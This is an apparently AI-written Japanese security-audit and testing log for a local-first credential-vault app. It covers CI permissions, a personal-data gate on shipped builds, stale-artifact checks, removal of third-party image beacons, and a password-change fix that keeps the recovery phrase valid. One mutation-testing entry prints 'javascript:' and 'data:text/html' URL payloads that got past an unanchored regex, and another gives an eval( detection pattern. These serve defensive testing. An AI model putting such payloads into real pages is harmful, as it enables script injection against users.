| R3-5 `plain:` フォールバックの可視化 | 利用者に見えているか | **そのファイルの権限はどうか** | ✅ `secrets.ts` は `mode: 0o600`。`atomicWrite` の既定も 0600 で、tmp 名は毎回一意 (`pid-時刻-乱数`) なので「既存ファイルには mode が効かない」罠 (`emotions.ts` に実測記録あり) に当たらない。控え `.prev` は `copyFile` 後に明示 `chmod` |
| R2-2 `customPath` | 4 つの書き出しは封じ込められているか | **同じ判断の 2 実装目 (`devEnv`) と食い違わないか** | ✅ 食い違うが**正しく食い違っている**。`devEnv` は読み側なので両側 realpath、`exportPaths` は書き側 (宛先が未作成なので realpath が原理的に当たらない) —— **両方に理由が書いてある** (0-a-14 の「揃えてはいけない 2 実装」) |

#### 併せて確かめた注記の主張

`devEnv.ts:297` は「現状 `readDevEnv()` は**引数なしでしか呼ばれず**」と
封じ込めの前提を書いている。この種の主張は腐るので数えた ——
製品コードの呼び出しは `linux.ts:176` の 1 件のみ・引数なし。**主張は今も正しい。**

#### この軸の見通し

`SECURITY_AUDIT.md` の完了項目で「隣の沈み先」を問える形のものは、
これで一巡した (R2-7 SW / R3-6 CSS url() / R2-13 script 埋め込みは
それぞれ別項に記録)。次は別の軸を立てること —— この軸をもう一度なぞっても
同じ白が出るだけになる。


---

### 週次 CI の書き戻しと、保管キーを選べるかを見た — 白 (2026-08-24)

**変更なしの回。** 別の軸を 2 つ立てた。

#### 軸 1: リポジトリ自身へ書き戻すワークフロー (`knowledge-auto.yml`)

週 1 回動き、派生物を再生成して Issue を立てる。供給網に効く経路なので見た。

- `permissions: contents: read / issues: write` —— **push しない**。最小権限
- 起動は `schedule` と `workflow_dispatch` のみ。`pull_request` が無いので
  **フォークからの実行経路が無い**
- `run:` に `${{ }}` の展開なし (同日追加した規則で機械的にも保証)
- `github-script` が組み立てる Issue 本文に入るのは**数値と生成日時だけ**。
  外部から来た文字列は 1 つも通らない

**「派生成果物ドリフトなしを検証」(`git diff --exit-code`) が空撃ちでないかを確かめた**
—— これは「検査対象が 0 件でも緑」の形になりやすい。実測: `knowledge-vault/` は
**7,543 ファイルが追跡下**にあり、再生成の対象になる。いっぽう
`orchestration/knowledge-queue.json` は `.gitignore` に在る ——
毎回変わる `generatedAt` を持つのでこれが追跡下だと**毎週必ず落ちる**。
**追跡と無視の割り当てが正しい。**

**外へ出る唯一の経路** (出典 URL の死活確認・週 400 件) も見た ——
`fetch(url, { method:'HEAD', redirect:'follow', signal })` で
**本文を一切読まず `res.status` だけ**を使う。中断シグナルつき。
記録先は gitignore された作業キューなので、仮に妙な先へリダイレクトされても
残るのは状態コードだけ。`execFileSync` は配列引数 (シェルを経由しない) で、
渡すのはコード上のリテラル。

#### 軸 2: 保管の**キー**を呼び出し側が選べるか

値の検証は同日に洗った (19 経路・白)。今度は**書き込み先の名前**を見た ——
キーを選べるなら、別機能の設定 (テーマ・接続先・プラン) を踏める。

`setItem` 18 件のうち、キーが定数でないのは 2 件だけで、どちらも白:

- `App.tsx` の `saveIds(key, …)` —— private ヘルパで、呼び出しは 4 か所すべて
  モジュール定数 (`RECENTS_KEY` / `FAVORITES_KEY`)。読み側も `isServiceId` で濾す
- `pkceSession.ts` の `storageKey(k)` —— `k` の型が
  `(typeof KEYS)[number]` (4 要素のタプル) なので**型で塞がっている**うえ、
  接頭辞つき

IndexedDB 側も `put` の鍵は `serviceId` / レコード id / 定数のいずれかで、
`store.ts:314` は更新時に `existing.collection` を引き継ぐので
**コレクションを跨いで書き換えることもできない**。

#### 所見 — この面は掘り尽くしつつある

直近 3 回のうち 2 回が変更なし。残っている最大の未解決は**コードの中に無い**
(公開済みリリースの棚卸し・Google Drive の共有設定・オリジンの分離)。
いずれも持ち主の判断が要る。


---

### 出荷する実物に個人データ検査を当てた (2026-08-24)

軸を静的な読みから**実測**へ移した。このセッションで一番重い発見は
「利用者の個人データが GitHub Pages で公開されていた」だったが、
その後に入れた `lint:sample-data` が見ているのは
`src` / `scripts` / `orchestration` で、**出荷される HTML そのものは
見ていなかった**。

#### まず実物を測った — 白だった

公開対象 6 件 (app / lite / landing / デモ 3 本) をビルドして、
**ゲート自身の `check()` を借りて**当てた:

```
  出荷成果物 6 件を検査 → ✅ 0 件
```

今のビルド構成ではバンドルは走査済みの 3 ディレクトリから作られるので
取りこぼしは無い。**が、それは構成が保証しているだけで、規則が
保証していることではない。**

#### 途中で 2 回まちがえた (どちらも報告前に潰した)

1. **自分の走査が誤検知した** —— `VENDOR_ID_SHAPES` を export から借りたが、
   同じ要素にある `skip` (Slack 自身のホスト) を写し忘れ、
   `https://api.slack.com` を個人ワークスペースとして 2 件挙げた。
   **正規表現だけ借りて除外を借りなかった** —— 写しを作ると比べているのが
   写しになる、の実演。`check()` ごと借りる形に直した。
2. **「カレンダー ID にゲートが無い」と思った** ——
   `VENDOR_ID_SHAPES` に Google カレンダーの形が無いのは事実。だが
   カレンダー ID はメール形なので**規則 2 (レンダラーのメールは example のみ)**
   に掛かり、実在する 2 件は `EMAIL_ALLOW` に理由つきで載っていた。
   実測して確かめた:

   | 入力 | 結果 |
   |---|---|
   | 台帳に無い個人カレンダー ID | ✅ 鳴る |
   | 祝日カレンダー (台帳) | ✅ 鳴らない |
   | 0 埋めの見本 (台帳) | ✅ 鳴らない |

   **穴ではなかったので、実装せずに済んだ。**

#### ゲートにした — `--artifact` モード

前例がある。`ci.yml` は inject-pwa を**実物**に当てている
(写しを見ていたせいで公開して初めて分かった事故が元)。同じ理由で
個人データ検査も実物に当てる。

- `lint-sample-data.cjs --artifact <file>…` を追加。規則は `check()` を借りる
- CI は既に `/tmp/inject-check/` へ app / index / lite を退避しているので、
  そこへ**デモ 3 本の退避を足した** —— デモは
  `build:web:lite` が `dist/` を空にする前に作られており、
  **誰にも見られないまま消えていた** (landing で同じ順序を読み違えて
  1 度 CI を落としている。同じ罠)
- 自己テスト 5 件。うち 1 件は「**渡したファイルが無ければ鳴る**」——
  ビルド忘れで 0 件になって緑、を塞ぐ
- 実測: 11MB の `standalone.html` に 169ms

対照として 5 種を実際に注入し、全部鳴ることを確認した
(Google ドキュメント / 個人カレンダー / Canva / 実在ドメインのメール /
Slack ワークスペース)。素の成果物は 0 件。

**CI と同じ順序をクリーンな `dist/` から通しで再現**して確かめている
(手元で個別にビルドすると順序の罠が再現しないため)。


---

### 自分が足したものを実機で確かめ、その検査を e2e に残した (2026-08-24)

`e2e` は **CI に入っていない**。にもかかわらず、直前に貸借対照表へ
入力欄を 4 つ足していた —— **誰も実機で見ていない状態**だった。

#### 実機で確かめた

Chromium で `dist/standalone.html` を開き、書類スタジオ →
計算書類（4点）まで進めて確認:

- 4 科目すべてが入力欄として出る
- 入れた額が貸借対照表の行に出る
- 資産・負債へ同額入れても貸借は崩れない
- **納付と還付を両建てすると検算が指摘する**
- ページエラー 0

#### 途中で 2 回まちがえた

1. **`data-doc-id="kessan"` を探して「タブが無い」と誤診した** ——
   `data-doc-id` は雛形書類 52 件の系統で、決算書は**別コレクション**
   (`data-collection="kessan"`)。実際に描画されている属性値を
   列挙して分かった
2. **自分の節だけ約束を破っていた** —— 他の 7 節はすべて
   自前の context を作って `setupVault` を呼ぶ。私の節は
   `browser.newPage()` で他の節の保管庫に相乗りしており、
   `SERVICE_HUB_E2E_ONLY=kessanTax` 単独では動かなかった。
   **`ONLY` は「本体を壊したらこの検査が落ちるか」を確かめるための
   仕組み**なので、単独で動かない節はその目的を果たせない

#### 検査として残した

`scripts/e2e/core.cjs` に `kessanTax` 節 (9 項目) を追加。

**対照実験も済ませた** —— `ACCOUNTS` から `仮払消費税等` を 1 行消して
ビルドし直すと、`kessan: 「仮払消費税等」の入力欄が在る` が名指しで落ちる。
復元して全 8 節が通ることも確認済み。

単体テストは `ACCOUNTS` の区分と区分合計を固定しているが、そこから
**「入力欄として画面に出るか」までは見ていない**。フォームは
`ACCOUNTS.map` で組み立てているので、その配線が切れたら
単体は通ったまま画面だけ空になる。そこを埋める節。


---

### 「壊したのに緑」を 2 回受け取った — e2e が古い成果物を黙って使っていた (2026-08-24)

クリックジャッキング拒否 (`frameGuard`) を実機で確かめ、e2e に節として
残そうとして**対照実験**をした。防御を外してビルドし直し、検査が落ちる
ことを見るはずだった。

**2 回とも「まだ効いています」という緑が返ってきた。**

#### 原因 — ビルドが失敗しても e2e は前回の HTML を使う

`npm run build:web` は `tsc -b && vite build && …` なので、型検査で
落ちると**成果物は作られないまま**その場で止まる。

- 1 回目: `if (isFramed())` → `if (false)` にしたら `isFramed` が未使用に
  なり `TS6133`
- 2 回目: `isFramed` の本体を `return false` にしたら引数 `w` が未使用で
  `TS6133`

どちらも `npm run build:web >/dev/null 2>&1` で握り潰していたため、
**古い (壊す前の) `dist/standalone.html` を相手に全項目が通った**。

`e2e` は対象ファイルの**存在**は確かめていたが、**新しさ**は見ていなかった。

#### なぜ重いか

「検査したつもり」がいちばん危ない。壊れていないことを確かめたのではなく、
**壊す前のものを見ていた**。しかも出力は完全に正常で、区別が付かない。

このリポジトリが繰り返し踏んでいる「写しを見ていた」と同じ形である
(`ci.yml` の inject-pwa 検証、CI の順序の罠、私自身の走査の誤検知)。
今回は**時間軸方向の写し**だった。

#### 直した

`scripts/e2e/core.cjs` に鮮度検査を追加。`src/` の最終更新時刻 (ただし
`__tests__` は束に入らないので除く) が成果物より新しければ **exit 2 で止める**。

```
E2E: 成果物が src/ より 62 秒古い (dist/standalone.html)。
     ビルドが失敗したまま古い HTML を検証しようとしています —
     そのまま流すと「壊したのに緑」を受け取ります。
```

意図して古い物を見たいときのために `SERVICE_HUB_E2E_ALLOW_STALE=1` を用意した
(注意書きを出して続行する)。3 通りとも実測済み — 古い→exit 2 /
古い+許可→続行 / 新しい→exit 0。

#### 対照実験のやり直し

`void w; return false;` でコンパイルを通してから壊すと、
**2 件が名指しで落ちた**:

- `frame: 拒否の見出しが出る` ❌
- `frame: 保管庫の画面も出さない` ❌

「サイドバーが無い」は**落ちなかった** —— 枠の中に出るのは初回設定画面で
サイドバーではないため。**この 1 件しか見ていなかったら対照は素通りしていた。**
拒否の文言と保管庫画面の両方を見ていたのが効いた。


#### 同じ罠を持つ道具を数えた — 3 つあった

鮮度を見ていなかったのは e2e だけではなかった。**成果物を相手にする道具**を
数えると 3 つある:

| 道具 | 見ていたもの | 危険 |
|---|---|---|
| `e2e` | 存在のみ | 古い HTML を検証して「壊したのに緑」 |
| `perf` | 存在のみ | 古いバンドルの起動性能を測って「問題なし」 |
| `smoke` | **何も見ていない** | 古い `dist/` を撮って「全ページ描画できた」 |

判定を 3 か所へ書き写すと、比べているのが写しになる。
`scripts/lib/artifact-freshness.cjs` に **1 つだけ**置き、3 つが借りる形にした。

3 つとも実測済み (新鮮 → exit 0 / 古い → exit 2):

```
  e2e   新鮮 exit=0 / 古い exit=2   dist/standalone.html (809 秒古い)
  perf  新鮮 exit=0 / 古い exit=2   standalone-lite.html + standalone.html
  smoke              古い exit=2   dist/index.html (810 秒古い)
```

検査 11 件 (`src/shared/__tests__/artifactFreshness.test.ts`)。うち効くのは
**`__tests__` を数えない** (検査だけ直したときに止めない) と
**束に入らない拡張子を数えない** (`.md` を触っても止めない) の 2 件 ——
誤検知で止まる道具は結局使われなくなるため、そこを固定する。


---

### 開いただけで第三者に信号が飛んでいた (2026-08-24)

Electron の smoke (72 ページ撮影) のログに **SSL ハンドシェイク失敗**が
1 行混ざっていた。**画面を撮るだけで外部通信が起きている**ということなので追った。

#### 実測した

同梱の見本データが参照する外部画像ホストを数えると 2 つ
(`design.canva.ai` ×6 / `avatars.githubusercontent.com` ×1、いずれも
`snapshot.ts`)。実際に飛ぶかをブラウザで数えた:

| 操作 | 外部通信 |
|---|---|
| 起動〜保管庫作成 | **0 件** (設計どおり local-first) |
| Canva のページを開く | **design.canva.ai へ 12 件** |
| GitHub のページを開く | **avatars.githubusercontent.com へ 2 件** |

**資格情報を 1 つも設定していない状態**で、ページを開くだけで
「この IP がこの時刻にこのアプリを開いた」が相手に渡っていた。

ID は見本化済みだったが**ホストは本物**なので、スクラブでは消えなかった
形である (`lint:sample-data` は ID の中身を見る規則で、
**ホストへ取りに行くこと自体**は対象外)。

見本の画像を取りに行く機能上の理由は無い。オフラインでは壊れるだけで、
アプリの「local-first」という性格とも噛み合わない。

#### 直した

7 件をインライン `data:image/svg+xml` の見本画像に置き換えた。
`safeImageSrc` は `data:image/*` を許可済みで、`<img>` 経由の SVG は
secure static mode なのでスクリプトは動かない。**通信そのものが起きない。**

再実測: 起動 0 件 / Canva 0 件 / GitHub 0 件。

#### ゲートにした — 字面ではなく挙動で

`e2e` に `noBeacon` 節 (6 項目)。**「何本出て行ったか」だけを数える。**

字面で禁じる規則 (`https://` を見本に書くな) にしなかったのは、経路が
`<img>` だけではないため —— CSS の `url()`・`fetch`・`<link>` でも同じことが
起きる。実際、同日に CSS `url()` の穴を別途塞いでいる。**挙動で見れば
経路によらず捕まる。**

対照実験済み — 1 件だけ外部 URL に戻すと
`beacon: canva を開いて外部通信 0 (実際 design.canva.ai:2)` と
**どこへ何本かまで名指しで**落ちる。


---

### 72 面を撮っていたが、エラーが出ていないかは誰も見ていなかった (2026-08-24)

`smoke` は全 74 サービス面を Electron で開いて撮る **唯一の道具** (e2e が
触るのは 10 面ほど)。だがこれまで見ていたのは

- 撮れたか
- 前ページの残像でないか (画像のバイト比較)

だけで、**ページが描画中に例外を投げても素通り**していた。撮影は成功し、
画像も別物になるので、区別が付かない。

#### エラー収集を足した

`console-message` と `render-process-gone` を拾い、**どのページで出たか**を
持たせた (件数だけでは直す手がかりにならない)。

**結果: 全 72 面で 0 件。** アプリは健全だった。

#### 「0 件」に意味を持たせる — 収集器の自己検査

Electron の `console-message` は版によって引数の形が違う (43 は詳細
オブジェクト、旧版は `(e, level, message)`)。取り違えても例外は出ず、
**黙って 0 件になる** —— つまり「エラー 0 件」が、健全なのか
収集できていないのか区別が付かなくなる。

そこで毎回、既知のエラーを 1 本出して**拾えたことを確かめてから**本番に入る。
拾えなければ `exit 2` で止める (0 件という報告を出さない)。

対照実験済み — `level` の判定を壊すと `exit 2` で止まり、
直すと `exit 0` に戻る。

#### 途中で自分の入れた欠陥を 1 つ捕まえた

報告は赤字で出るのに **終了コードが 0 のままだった**。
`process.exitCode = 1` を立てても **`app.quit()` はそれを見ない**
(Electron は何を入れても 0 で終わる)。呼び出し側は成功と受け取る。

同じファイルの catch 側は元から `app.exit(1)` を使っており、
**こちらだけ揃っていなかった**。`app.exit(code)` に直した。

3 通りとも実測:

```
  収集器が壊れている  → exit 2 (0 件という報告を出さない)
  エラーが出た        → exit 1
  正常               → exit 0
```


---

### 文書が「無い」と言って、動く仕組みを隠していた (2026-08-24)

自分が足した e2e 3 節 (`kessanTax` / `frameGuard` / `noBeacon`) が
CI で一度も走っていないことに気づき、「関門はあるが通す仕組みが無い」形かを
確かめた。**仕組みはあった。**

`.github/workflows/e2e.yml` は `e2e` / `e2e:lite` / `perf` を実行する。
既定では走らないが (Actions 分の節約)、**2 つの起動口**が用意されている:

1. Actions 画面からの `workflow_dispatch`
2. PR に **`run-e2e` ラベル**を付ける

ところが **CLAUDE.md はこの 3 つを「**not** in CI」と書いたまま**だった。

#### なぜ重いか

CLAUDE.md は Claude Code セッションへの**指示書**である。「CI には無い」と
書いてあれば、読んだ側は**そこで探すのをやめる**。実際この e2e 経路は
誰にも使われないまま残っていた —— 私自身、workflow を開くまで存在を知らなかった。

このリポジトリは逆向きの事故を既に踏んでいる (CLAUDE.md が
`lint:forbidden` の規則を宣言しているのに実装が無かった)。
**実装が説明より先を行く形も、同じくらい起きる。**

#### 直した + 機械で見るようにした

CLAUDE.md を実態に合わせ、**ラベルの名前まで書いた** (知らなければ使えない)。

`cross-doc-consistency.cjs` に `checkNotInCiClaims` を追加 ——
**「not in CI」と書いてあるものが、本当にどの workflow でも走っていないか**。
既存の `checkCiGateCoverage` (ゲートを足したのに CI へ繋ぎ忘れた) の
ちょうど裏返しになる。

対照実験済み — 直す前の記述に戻すと、実ファイルに対して 3 件が名指しで鳴る:

```
❌ fact "not-in-CI claims" — CLAUDE.md は "e2e" を「not in CI」と書いているが
   .github/workflows/e2e.yml が実行している — 「無い」と信じさせて動く仕組みを隠している
   (e2e:lite / perf も同様に 3 件)
```

自己テスト 5 件。うち効くのは **前方一致で誤爆しない**
(`e2e` の主張は `e2e:lite` の実行に当たらない) —— 既存の
`checkCiGateCoverage` が同じ罠で `lint:test` / `lint:test-coverage` を
取り違えた前例がある。

#### ラベルは付けていない

`run-e2e` を付ければ CI で回せるが、**Actions 分は持ち主の資源**であり、
このリポジトリは無料枠を明示的に節約する方針で書かれている。
3 節とも対照実験つきでローカル検証済みなので、**判断は持ち主に委ねる**。
マージ前に一度回すなら、PR に `run-e2e` を付けるだけでよい。


---

### 指示書の数値が腐っていた — 機械照合を CLAUDE.md へ広げた (2026-08-24)

「文書が実装より遅れる」を直した流れで、**CLAUDE.md の数値の主張**を全部測った。
`verify:arch` は `docs/ARCHITECTURE.md` の数だけを見ており、
**同じ種類の主張が別のファイルに在るというだけで腐り放題**だった。

| 主張 (CLAUDE.md) | 実測 | ずれ |
|---|---:|---|
| `~1460 tests` | **9,614** | 6.6 倍 |
| `~1130 notes` (vault) | **7,543** | 6.7 倍 |
| `innerHTML ほか 21 種` | **31 種** | |
| CI で `all 28 verify:all gates` | **30** | **同じファイルの 87 行は「30 ゲート」** |
| `10.7 MiB / 2.6 MiB` (2026-08-11) | 10.8 / 2.7 | 軽微 |

74 services / 30 ゲート は正しかった。

#### 直し方を数の性質で分けた

- **テスト数は CLAUDE.md から消した** —— 数を 2 か所に書けば必ず食い違う。
  唯一の出所 (`ARCHITECTURE.md` の表、厳密照合済み) を指すだけにした
- **変わりにくい数は厳密照合** —— 禁止パターン数・ゲート数。
  `verify:arch` の `METRICS` に `docFile` を持たせ、突き合わせ先を選べるようにした
- **増える一方の数は下限** —— vault は `7,500+ notes` と書き、`gte` で見る。
  厳密にすると知識を 1 件足すたびに doc を直すことになり、その churn が
  「直さずに数だけ古くなる」を招く

#### 数え方は 1 つに寄せた

`countStaticIts()` を切り出した。ARCHITECTURE.md の表と (かつての)
CLAUDE.md の両方が同じ関数を使う —— 数え方を写すと、片方だけ直したときに
**「どちらが正しいのか分からない 2 つの数」**になる。

#### 既存の自己検査が私の変更を捕まえた

`指標の記述を丸ごと消す` は「ARCHITECTURE.md を空にすれば全指標が落ちる」を
`METRICS.length` で見ていた。CLAUDE.md 由来の指標を足すと**それらは落ちない**
ので 11/15 になり、自己検査が鳴った。期待値を
「arch を出所とする指標の数」に直し、逆方向の検査
(`CLAUDE.md 由来の指標が 1 つも無くなっていないか`) も足した。

#### 限界 (正直に)

vault の `7,500+` を `1,130+` に書き換えても `gte` は通る。
**`+` 付きの主張なので floor が意味的に正しく**、防げるのは過大主張だけである。
過小主張 (実態より小さく書く) は捕まらない。


---

### 関門がコンポーネントの中に隠れていて、一度も測られていなかった (2026-08-24)

自分が今日足したものがこのリポジトリ自身の基準を満たしているかを確かめた。
変異検査の対象 (243 件) を見ると、**`safeImageSrc` / `safeCssUrl` だけが
外れていた。**

同種の壁はすべて `src/shared/` の単一目的モジュールとして載っている
(`externalUrlGate` / `httpLimits` / `safeFilename` / `controlChars`)。
これだけが `components/DataList.tsx` の中に置かれており、

- `mutate` に **`.tsx` が 1 件も無い** → 変異体が 1 つも作られない
- `MUST_MEASURE` (必ず測る壁の名簿) にも載りようがない

という状態だった。**関門がコンポーネントの中に隠れていたことが、
見落とされた原因そのもの**である。

(同じ形は `exportPaths.ts` と `frameGuard.ts` で既に踏んでいる。
名簿はそのために在る。)

#### 出して測ったら 80.00%・生存 5

`src/shared/imageUrlGate.ts` へ移し、`mutate` と `MUST_MEASURE` に載せて実測。
**5 件のうち 3 件は本物の抜けだった。**

| 生存した変異 | 何が漏れていたか |
|---|---|
| `/^https?:\/\//` → `/https?:\/\//` | **先頭の `^` を外しても検査が通る** |
| `/^data:image\/…/` → 同上 | 同じ |
| `[;,]` → `[^;,]` | `data:image/png` (終端なし) を弾く検査が無い |
| `.trim()` 削除 | 前後の空白を扱う検査が無い |
| `replace(…, '')` → 別文字列 | tab を**取り除いた値が返る**ことの検査が無い |

アンカーの 2 件は実測で確かめた:

```
  "javascript:alert(\"https://example.com\")"
     アンカーあり → undefined
     アンカー無し → そのまま通る
  "data:text/html,<img src=\"https://example.com\">"
     アンカー無し → そのまま通る
```

`<img src>` では実害が出ないが、**同じ値が `safeCssUrl` 経由で CSS へ流れる**
(同日に塞いだ経路)。関門の意味が消える。

#### 100.00% にした

検査を 5 件足して 25 変異体すべてを殺した (**80.00% → 100.00%**)。

途中で**自分の期待値が誤っていた**のを 1 件捕まえた ——
`data:image/pngX,AAAA` は弾くべきだと書いたが、`pngX` はサブタイプの綴りとして
正当なので通るのが正しい。**規則が正しく、期待が誤っていた**ので期待を直した。

#### 移動したら台帳が鳴った

`lint:forbidden` の `KNOWN_SUPPRESSIONS` は双方向 (台帳にあるのに効いていない
例外も鳴る) なので、関門を移した瞬間に
「台帳にあるのに効いていない例外が 1 件あります (要らない穴)」で落ちた。
指す先を移動先へ直した。**双方向の台帳はこう効く。**


---

### パスワードを変えると、控えた 24 語が使えなくなっていた (2026-08-24)

軸を**失敗経路**に移した ——「守りは正常系では効いているが、
保管領域が使えないときに fail-open していないか」。`setToken` は
失敗を握り潰さず、呼び出し 7 か所すべてが画面に出していた (白)。

ところが**パスワード変更の経路**で手が止まった。

#### 何が書いてあったか

`SettingsPage.changePassword` は保管庫の内部を画面側で組み立てていた:

```
  1. 旧パスワードで解錠して全トークンを平文で読む
  2. indexedDB.deleteDatabase('business-hub-vault')   ← 保管庫ごと消す
  3. initialize(newPw)
  4. ループで書き戻す
```

2 が要るのは `initialize()` が既存 meta を見て throw し、かつ
**新しいマスター鍵を生成する**ため。つまりこの順序は設計上避けられず、
**失窓は構造的**だった。

#### 結果は 2 つ。重いのは 2 つ目

**(A) 消してから書き戻すまでが失窓。** その間、資格情報の唯一の複製は
メモリ上の平文だけ。中断 (書き込み失敗・自動施錠・タブを閉じる・再読込・
クラッシュ) で、まだ書き戻していない分は永久に失われる。実証済み ——
中断すると全消失、途中で失敗するとそこから先が消失。

**(B) 控えた 24 語が通らなくなる。** `initialize()` は新しいフレーズを
生成して**返す**が、画面はその戻り値を捨てていた。実測:

```
  変更後、利用者が控えたフレーズで recoverWithMnemonic → 失敗
  通るフレーズは initialize() の戻り値の中にしか無く、誰も見ていない
```

つまり**パスワードを変更するたびに、パスワードを忘れたときの唯一の綱が
静かに切れていた**。しかもインターフェースの注記は
「mnemonic は `initialize()` のものが永続」「`rotateRecoveryKey` は常に throw」
と書いており、**画面の実装がその不変条件を破っていた**。

#### 直し方は既にそこに在った

`recoverWithMnemonic` の注記を読むと:

> Validate mnemonic, unwrap master key, re-initialize under newPassword.
> **Preserves all stored tokens.**

**保管庫は正しい再鍵化を最初から持っていた** —— 認証手段がフレーズなだけ。
トークンは**マスター鍵**で暗号化されており、パスワードはそのマスター鍵を
包んでいるだけなので、パスワード変更は**包み直すだけ**でよい。

`vault.changePassword(oldPw, newPw)` を追加し、画面はそれを呼ぶだけにした。
トークンにもリカバリー枝にも触らないので、控えた 24 語は生き続ける。

#### ついでに見つけた潜在的な穴

`recoverWithMnemonic` は meta と `master-wrap` を **`idbPut` 2 回**で書いていた
= トランザクションが 2 つ。2 回目が失敗すると
**`kcv` は新パスワードを指し、`master-wrap` は旧パスワードで包まれたまま**の
保管庫が残る —— **新旧どちらのパスワードでも開けない**。

IndexedDB のトランザクションは同一 DB 内の複数ストアに対して原子的なので、
`idbPutAll` を足して 1 トランザクションにまとめた。新しい `changePassword` も
同じヘルパを使う (レガシー保管庫ではトークンの読み替えも同じ 1 つに入れる)。

#### 検証 9 件

控えた 24 語が変更後も通る / **2 回続けて変更しても最初のフレーズで復旧できる** /
トークンが 1 件も失われない / 新パスワードで開き旧で開かない /
**現在のパスワードが違えば何も変えずに落ちる** / 長さは保管庫の規則で弾く /
未初期化なら落ちる。

**対照を 1 件残した** —— 以前の手順 (消してから作り直す) を再現すると
控えたフレーズが通らなくなることを固定してある。回帰したらここで気付く。


#### 発生源の形をゲートにした

パスワード変更の穴を直した後、**同じ形が他に無いか**を掃いた。
画面 (`components/` / `pages/`) が保管領域の内部を触っている箇所は **0 件**
—— 直した 1 件が最後だった。

そこで形そのものを止めた。`lint:forbidden` に 32 個目の規則:
**`indexedDB.` / `.transaction(` / `objectStore(` を書いてよいファイルを台帳で固定する。**

今日見つけた 3 件の発生源は全部同じ形をしている:

| 見つかったもの | 何がどこに書かれていたか |
|---|---|
| パスワード変更の失窓 + フレーズ喪失 | **画面**が保管庫の消去と再作成を組み立てていた |
| 関門が変異検査から外れていた | **コンポーネント**の中に URL の関門が居た |
| CSS `url()` のスキーム素通り | **描画箇所**に検証を書いていた |

共通するのは「**その層の仕事でないものが、その層に書かれていた**」こと。

台帳は 8 件 —— 保管層のモジュール 5 つ (`vault` / `store` / `proxy` /
`library` / `fsa`) と、**外から**保管領域を覗いて検証する道具 3 つ
(暗号化されているかを実物で確かめる側なので、禁じると検証手段のほうが消える)。

対照実験済み — 直す前の 1 行を戻すと
`src/renderer/pages/SettingsPage.tsx:340` と**名指しで**落ちる。
自己テスト 6 件 (直接操作の 3 形は鳴る / 散文の "transaction" は鳴らない /
ストア・保管庫の API 越しは鳴らない)。

**この規則の追加を、同日に足した CLAUDE.md の指標が捕まえた** ——
禁止パターン数 31 → 32 のずれで `verify:arch` が落ちた。名簿が名簿を守っている。


#### 自分が書いたコードを疑って、2 つ見つけた

パスワード変更を直した後、**その直し自体**を点検した。

**(1) `idbPutAll` に空配列を渡すと投げる。** `db.transaction([], …)` は仕様上
`InvalidAccessError` になる (実測で確認)。今日の呼び出しは空を渡さないが、
2 つのセキュリティ経路が共有するヘルパで「書くものが無い」を例外にすると
後から使う人が踏む。無害な no-op に倒した。

**(2) レガシー経路が AAD を無条件に要求していた。** `getToken` は
記録の版で分けている (版つき = AAD あり / 版なし = AAD 導入前) のに、
私の書いたレガシー再暗号化は無条件で AAD つきの復号を要求していた。
**Phase E 以前の保管庫は AAD 以前より更に古いので必ず版なし**である。
つまり **レガシー利用者はパスワードを一切変更できない**状態を作っていた。
`getToken` と同じ判定に揃えた。

#### 対照が 2 回空振りした

(2) の検査を書くのに 3 度かかった。

1. レガシー保管庫を作って `setToken` → **`setToken` は常に AAD つきで書く**
   ので版なしの枝を通らない。対照が鳴らない
2. AAD 以前の記録を直接書き込む助数関数を足した → それでも鳴らない。
   原因は検査の中で `getToken` を呼んでいたこと ——
   **`getToken` は版の無い記録をその場で AAD へ束ね直す**ので、
   `changePassword` に届く前に旧形式が消えていた
3. その呼び出しを外して、ようやく対照が鳴った

「鳴らなかった」をまず**プローブの不具合**として疑う (0-a-15) が、
ここでは 2 回続けてプローブ側だった。


#### 「通信が起きない」だけでは足りなかった

見本画像を `data:` に差し替えた後、**絵として描けているか**は誰も見ていなかった。
`noBeacon` は通信の本数しか数えないので、**SVG の符号化を壊しても通ってしまう**
—— 画面には壊れた画像が出るのに緑になる。

描画確認を同じ節へ足した (`naturalWidth`/`naturalHeight`/`complete`)。

対照が決定的だった。SVG の閉じタグを削ってビルドし直すと:

```
  ✅ beacon: canva を開いて外部通信 0 (実際 0 件)      ← 通信検査は通ったまま
  ❌ beacon: canva の data: 画像が描けている (6 件中 壊れ 6)
```

**通信検査では捕まえられないものを捕まえる**ことが示せた。

#### 自分のプローブが 3 度目に間違えた

最初の実測で「7 件すべて描画できていない」と出た。**プローブの誤り**である ——
写した先の名前が `w`/`h` なのに判定で `i.naturalWidth` を読んでおり、
`undefined > 0` が常に false になっていた。出力に併記した
`w:320 h:180 complete:true` を読めば、実際には描けていると分かる。

今日、対照やプローブが空振りしたのはこれで **5 回目**
(ビルド失敗 2 回・`setToken` の AAD・`getToken` の束ね直し・この名前違い)。
**「鳴らなかった」も「全部鳴った」も、まず測り手を疑う。**


#### ついでにゲートの誤爆を 1 つ直した

描画確認に Playwright の `page.$$eval(...)` を使ったら、禁止パターンの
`eval(` が鳴った。`$` は非単語文字なので `\beval\s*\(` の `\b` が成立してしまう。
**JS の `eval` ではない**ので誤爆である。

直前の `$` を除外する形にした (`(?<!\$)\beval\s*\(`)。
`eval(` / `;eval(` / `window.eval(` は今も当たる。自己テスト 4 件で両方向を固定。

精度の低いゲートは鳴らし続けて無視されるのが最悪の結末なので、
**誤爆を見つけたらその場で直す**。


#### 実機で通した — 「変えても控えたフレーズで戻れる」

単体検査は fake-indexeddb で通っていたが、**トランザクションの意味論は実物で
確かめる価値がある**。`e2e` に `vaultPassword` 節を足した (11 節目)。

利用者から見た全段を実 Chromium・実 IndexedDB で通す:

```
  ✅ リカバリーキー 24 語を画面から拾えた (実際 24)
  ✅ パスワードを変更できた
  ✅ 旧パスワードでは開かない
  ✅ 新パスワードで開く
  ✅ ★ パスワード変更後も、控えた 24 語で復旧できる (実際 ok)
```

**対照で決定的に示した** —— 以前の手順 (消してから作り直す) に戻してビルドすると、
最初の 4 段は通ったまま**復旧だけが落ちる**:

```
  ❌ ★ パスワード変更後も、控えた 24 語で復旧できる (実際 rejected)
```

`rejected` はアプリ自身が出した「リカバリーキーが違います」である。

##### 失敗の出方も直した

最初この段は `.sidebar` を待つだけで、対照が **30 秒のタイムアウト + FATAL** に
なった。何が起きたか読めない失敗である。成功と拒否の**どちらが出たか**を
待って名指しするようにした (`ok` / `rejected` / `timeout`)。

**精度と同じくらい、失敗の読みやすさが検査の価値を決める。**


---

### 名簿どうしが食い違っていた — 「測る壁」と「守る壁」 (2026-08-25)

